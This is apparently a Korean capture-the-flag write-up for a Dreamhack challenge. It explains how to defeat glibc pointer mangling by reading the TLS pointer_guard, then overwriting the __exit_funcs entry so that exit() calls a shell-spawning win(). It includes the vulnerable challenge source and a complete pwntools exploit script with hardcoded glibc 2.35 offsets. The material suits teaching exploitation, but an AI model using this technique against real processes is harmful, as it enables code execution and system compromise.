# __exit_funcs overwrite

## 개요
이 문제는 `__exit_funcs`(exit handler list)에 등록된 함수 포인터를 조작해서 `system("/bin/sh")`를 실행하는 `win()` 함수로 실행 흐름을 바꾸는 문제임. `_rtld_global`/`rtld` writeup에서 다룬 것처럼 glibc는 프로세스가 종료될 때 `__run_exit_handlers`에서 `__exit_funcs` 리스트에 등록된 함수 포인터(`ef_at`, `ef_on`, `ef_cxa` 등)를 순서대로 호출함. glibc 2.34 이전(이 문제의 배포 환경은 Ubuntu 22.04 → glibc 2.35이지만 `__exit_funcs` 자체는 여전히 존재하며 포인터는 `PTR_MANGLE`로 암호화되어 저장됨) 버전에서는 이 포인터들이 전역 변수 영역(.data/.bss, libc 내부)에 평문이 아닌 **mangled** 상태로 저장되어 있고, 호출 직전에 `PTR_DEMANGLE`로 복호화됨.

바이너리 자체에는 스택 오버플로우나 포맷 스트링 같은 전형적인 취약점이 없고, 대신 **임의 주소 읽기(AAR)**와 **임의 주소 쓰기(AAW)**를 직접 제공함. 이 두 프리미티브만으로

1. libc base와 `win()`의 주소를 구하고
2. `fs:0x30`(TLS 영역, 스택 쿠키/포인터 가드가 저장된 위치)에서 포인터 가드 값을 읽어
3. `win()` 주소를 해당 가드로 `PTR_MANGLE` 한 값을, `__exit_funcs`의 첫 번째 `exit_function` 엔트리(`initial.fns[0].func.at`)에 덮어써서

프로그램이 정상적으로 종료되는 순간(`exit(0)` → `__run_exit_handlers`) `win()`이 호출되도록 만드는 것이 이 문제의 핵심임.

## 바이너리 분석

```c
// gcc main.c -o main -z relro -z now
void init() {
    setbuf(stdout, NULL);
    setbuf(stdin, NULL);
    setbuf(stderr, NULL);
}

void win() {
    system("/bin/sh");
}

int main(int argc, char *argv[])
{
    size_t *addr, *fs_base;
    size_t value;

    init();

    printf("[__run_exit_handlers]\n");

    syscall(SYS_arch_prctl, ARCH_GET_FS, &fs_base);
    printf("fs_base: %p\n", fs_base);
    printf("stdout: %p\n", stdout);
    printf("win: %p\n", win);

    printf("[AAR]\n");
    printf("Address: ");
    scanf("%zu", (size_t *) &addr);
    printf("Value: %#zx\n", *addr);
    printf("Successful AAR!\n");

    printf("[AAW]\n");
    printf("Address: ");
    scanf("%zu", (size_t *) &addr);
    printf("Value: ");
    scanf("%zu", &value);
    *addr = value;
    printf("Successful AAW!\n");
}
```

바이너리가 알려주는 것:

- `fs_base` : `arch_prctl(ARCH_GET_FS, ...)`로 직접 TLS base를 출력해줌. 즉 `fs:0x30`(포인터 가드가 저장된 오프셋)의 **절대 주소**를 바로 계산할 수 있음.
- `stdout` : libc 내부 `_IO_2_1_stdout_` 심볼의 주소를 그대로 출력해줌 → libc base 계산용 leak.
- `win` : PIE가 걸려있다면 바이너리 base 계산용 leak (스택트레이스 상 `win`은 바이너리 내부 함수).

그 다음 AAR 한 번, AAW 한 번을 제공함:

- AAR: 임의 주소를 읽어서 그 값을 출력 (주소를 숫자로 읽음 → `*addr` 출력)
- AAW: 임의 주소에 임의 값을 씀

이 AAR/AAW는 **딱 한 번씩만** 제공되므로, 한 번의 AAR로는 ptr_guard(포인터 가드) 값을 읽고, 한 번의 AAW로는 `__exit_funcs`의 함수 포인터를 덮어써야 함. 즉 leak은 전부 `printf`로 주어지는 3개의 주소(fs_base, stdout, win)로 끝내야 하고, AAR 한 번은 포인터 가드를 읽는 데 써야 함.

`-z relro -z now`(Full RELRO)가 걸려있어서 GOT overwrite는 불가능하지만, 이 문제는 어차피 GOT를 노리지 않고 `__exit_funcs`(libc 내부 데이터 영역)를 노리므로 RELRO와는 무관함.

## 공격 대상: `__exit_funcs`와 `PTR_MANGLE`

glibc의 `__run_exit_handlers` 내부 구조 (`_rtld_global` note 참고):

```c
struct exit_function
{
  long int flavor;
  union
    {
      void (*at) (void);
      struct { void (*fn) (int status, void *arg); void *arg; } on;
      struct { void (*fn) (void *arg, int status); void *arg; void *dso_handle; } cxa;
    } func;
};

struct exit_function_list
{
  struct exit_function_list *next;
  size_t idx;
  struct exit_function fns[32];
};
```

`exit()` → `__run_exit_handlers()`가 `cur->fns[--cur->idx]`를 꺼내서 `flavor`에 따라 `f->func.at`(또는 `on.fn`, `cxa.fn`)을 호출하는데, 호출 직전에 반드시 `PTR_DEMANGLE`을 거침:

```c
case ef_at:
  atfct = f->func.at;
#ifdef PTR_DEMANGLE
  PTR_DEMANGLE (atfct);
#endif
  atfct ();
  break;
```

즉 `fns[]` 배열에 저장되는 함수 포인터는 평문이 아니라 **TLS의 포인터 가드 값으로 mangle된 값**임. glibc의 mangle/demangle 알고리즘(x86-64)은 다음과 같음:

```c
#define PTR_MANGLE(var) \
  asm ("xor %%fs:%c1, %0\n" "rol $0x11, %0" : "=r" (var) : "i" (offsetof(tcbhead_t, pointer_guard)), "0" (var))
#define PTR_DEMANGLE(var) \
  asm ("ror $0x11, %0\n" "xor %%fs:%c1, %0" : "=r" (var) : "i" (offsetof(tcbhead_t, pointer_guard)), "0" (var))
```

- Mangle: `rol((ptr ^ pointer_guard), 0x11)`
- Demangle: `ror(mangled, 0x11) ^ pointer_guard`

`pointer_guard`는 TLS 영역(`tcbhead_t`) 내부, `fs:0x30`에 저장되어 있고 프로세스마다 랜덤으로 설정됨(`tcbhead_t.pointer_guard` offset이 x86-64에서 0x30). 이 값을 모르면 임의의 주소를 mangle해서 넣어도 demangle 결과가 쓰레기 값이 되어 crash만 유발함. 따라서 공격 순서는:

1. `pointer_guard`를 AAR로 읽어온다 (`fs_base + 0x30`)
2. `win()`의 주소를 이 `pointer_guard`로 mangle한다
3. mangle된 값을 `__exit_funcs`의 첫 번째 `exit_function.func.at`에 AAW로 덮어쓴다
4. `main()`이 리턴하면서 `exit()` → `__run_exit_handlers()`가 실행되고, `PTR_DEMANGLE`을 거치면 정확히 `win()`의 주소가 복원되어 호출됨

## GDB로 오프셋 구하기

실제 익스플로잇에 필요한 두 개의 libc 오프셋:

- `stdout`(`_IO_2_1_stdout_`) 심볼 오프셋 → libc base 계산용
- `__exit_funcs`(전역변수, `struct exit_function_list *`가 가리키는 `initial` 구조체) 내 `fns[0].func.at`의 오프셋

pwndbg를 붙여서 확인하는 방법:

```
gdb ./main
pwndbg> b *main+<scanf 두번째 호출 직후, 리턴 직전>
pwndbg> r
pwndbg> p &stdout       # 혹은 symbol-address stdout
pwndbg> p/x $rebase_offset  # stdout - libc_base
```

더 직접적으로는 libc를 attach한 뒤:

```
pwndbg> p (void*)&_IO_2_1_stdout_ - (void*)&__libc_start_main   # 식으로 오프셋 계산 (버전에 따라 __libc_start_main 대신 libc base 사용)
```

혹은 간단히 `vmmap`으로 libc base를 확인하고 `stdout` 전역변수(바이너리의 `stdout`은 `_IO_2_1_stdout_`의 주소를 담은 포인터이므로, 문제에서 출력하는 `stdout`은 이미 libc 내부 주소 그 자체임)의 주소에서 libc base를 빼면 오프셋이 나옴.

`__exit_funcs`의 경우, `__exit_funcs`는 libc의 전역 변수로 `struct exit_function_list *__exit_funcs = &initial;` 형태로 선언되어 있고, 최초에는 정적으로 할당된 `initial` 구조체(`struct exit_function_list initial`)를 가리킴. 따라서:

```
pwndbg> p &initial
pwndbg> p &initial.fns[0].func.at
```

위처럼 심볼 테이블에 `initial`이 남아있다면(static이라 디버깅 심볼이 없을 수도 있어 `__exit_funcs` 포인터를 역참조하거나, libc 소스의 오프셋 표를 이용) `initial.fns[0].func.at`의 libc base 기준 오프셋을 구할 수 있음. 이 문제의 배포 환경(Ubuntu 22.04, glibc 2.35)에서 실제로 구한 오프셋이 `poc.py`에 다음과 같이 하드코딩되어 있음:

```python
stdout_off   = 0x21b780          # stdout(=_IO_2_1_stdout_) - libc_base
initial_fns  = libc_base + 0x21bf18   # &initial.fns[0].func.at
```

즉 `stdout` leak으로 `libc_base = stdout_addr - 0x21b780`를 구하고, 거기에 `0x21bf18`을 더하면 `initial.fns[0].func.at`의 실제 주소를 얻을 수 있음. (gdb에서 `vmmap`으로 libc 매핑 시작 주소를 확인하고, `p &initial` 또는 `p &initial.fns[0]`의 주소에서 그 시작 주소를 빼면 동일한 오프셋을 얻음.)

## 익스플로잇 ( `poc.py` ) 단계별 설명

```python
from pwn import *
p = remote('host3.dreamhack.games', 22447)

def rol(value, shift, width=64):
    return ((value << shift) | (value >> (width - shift))) & ((1 << width) - 1)

def ptr_mangle(ptr, ptr_guard):
    return rol((ptr ^ ptr_guard), 0x11)
```

- `rol`: 64비트 left-rotate 구현.
- `ptr_mangle`: glibc의 `PTR_MANGLE`과 동일한 연산 `rol(ptr ^ pointer_guard, 0x11)`을 파이썬으로 재현. 이게 성립해야 나중에 glibc가 `PTR_DEMANGLE`(= `ror(mangled, 0x11) ^ pointer_guard`)을 수행했을 때 원래의 `win()` 주소가 복원됨.

### 1단계: leak (fs_base, libc base, win)

```python
p.recvline()
fs_base = int(p.recvline().decode().split()[1], 16)
stdout_addr = int(p.recvline().decode().split()[1], 16)
stdout_off = 0x21b780
libc_base = stdout_addr - stdout_off
win_addr = int(p.recvline().decode().split()[1], 16)
```

바이너리가 출력해주는 `fs_base: %p`, `stdout: %p`, `win: %p` 세 줄을 그대로 파싱함.

- `fs_base`: TLS 영역의 시작 주소. `fs:0x30`에 접근하려면 `fs_base + 0x30`을 그냥 더하면 됨(arch_prctl로 FS 세그먼트 베이스를 직접 받았으므로 세그먼트 레지스터 트릭 없이 평범한 가상주소 연산으로 계산 가능).
- `stdout_addr`: libc 내부 `_IO_2_1_stdout_`의 실제 주소. 여기서 미리 gdb로 구해둔 오프셋(`0x21b780`)을 빼서 `libc_base`를 계산.
- `win_addr`: 바이너리 내부 `win()`의 실제 주소 (이 바이너리는 PIE가 걸려 있어도 어차피 주소를 직접 출력해주므로 별도 base 계산 불필요).

### 2단계: AAR로 포인터 가드 leak

```python
p.recvline()
p.sendlineafter(b': ', str(fs_base + 0x30).encode())
ptr_guard = int(p.recvline().decode().split()[1], 16)
p.recvline()
```

문제가 제공하는 **단 한 번의 AAR**을 `fs_base + 0x30`, 즉 TLS의 `pointer_guard` 필드를 읽는 데 사용함. 출력되는 `Value: %#zx` 줄을 파싱해서 `ptr_guard`를 얻음. 이 값이 있어야 mangle 연산을 정확히 재현할 수 있음.

### 3단계: AAW로 `__exit_funcs` 덮어쓰기

```python
p.recvline()
initial_fns = libc_base + 0x21bf18
p.sendlineafter(b': ', str(initial_fns).encode())
p.sendlineafter(b': ', str(ptr_mangle(win_addr, ptr_guard)).encode())
```

- 쓸 주소: `libc_base + 0x21bf18` = `initial.fns[0].func.at`의 실제 주소.
- 쓸 값: `ptr_mangle(win_addr, ptr_guard)` = `win()` 주소를 방금 구한 `pointer_guard`로 mangle한 값.

이 AAW가 실행되면 `initial.fns[0].func.at`에는 **"mangle된 win() 주소"**가 저장됨. glibc 입장에서는 이게 정상적으로 `atexit()` 등으로 등록된(그리고 PTR_MANGLE로 암호화되어 저장된) 콜백처럼 보임.

### 4단계: 자연스러운 트리거

별도의 트리거 코드가 없는 이유는, `main()`이 `return`하면 자동으로 `exit()` 체인이 실행되기 때문. 흐름은:

```
main() return
→ __libc_start_main 내부에서 exit(result) 호출
→ __run_exit_handlers() 실행
→ cur->fns[--cur->idx] 에서 flavor == ef_at 인 엔트리(fns[0]) 를 pop
→ atfct = f->func.at;           // 우리가 덮어쓴 mangled 값
→ PTR_DEMANGLE(atfct);          // ror(mangled, 0x11) ^ pointer_guard == 원래 win() 주소로 복원
→ atfct();                      // win() 호출 → system("/bin/sh")
```

마지막으로 `p.interactive()`를 호출해 셸을 획득함.

## 핵심 요약

| 단계 | 사용 프리미티브 | 목적 |
|---|---|---|
| leak | `printf`가 알려주는 3개 주소 | `fs_base`(TLS base), `libc_base`(stdout 오프셋 역산), `win_addr` |
| AAR (1회) | `fs_base + 0x30` 읽기 | TLS 내 `pointer_guard`(포인터 가드) 값 획득 |
| 계산 | `rol(win_addr ^ pointer_guard, 0x11)` | glibc `PTR_MANGLE`과 동일한 인코딩 재현 |
| AAW (1회) | `libc_base + 0x21bf18`에 쓰기 | `initial.fns[0].func.at`을 mangled `win()` 주소로 교체 |
| 트리거 | 없음 (자연 종료) | `main` 리턴 → `exit()` → `__run_exit_handlers()`가 알아서 demangle 후 호출 |

이 문제의 핵심 교훈은 glibc가 `PTR_MANGLE`/`PTR_DEMANGLE`로 함수 포인터를 "보호"하고 있어도, **포인터 가드 자체를 TLS에서 읽을 수 있는 임의 읽기 프리미티브가 있으면 그 보호는 완전히 무력화**된다는 점임. Full RELRO로 GOT를 막아도, `__exit_funcs`처럼 GOT 바깥에 있는 libc 내부의 함수 포인터 테이블은 여전히 공격 표면이 됨.
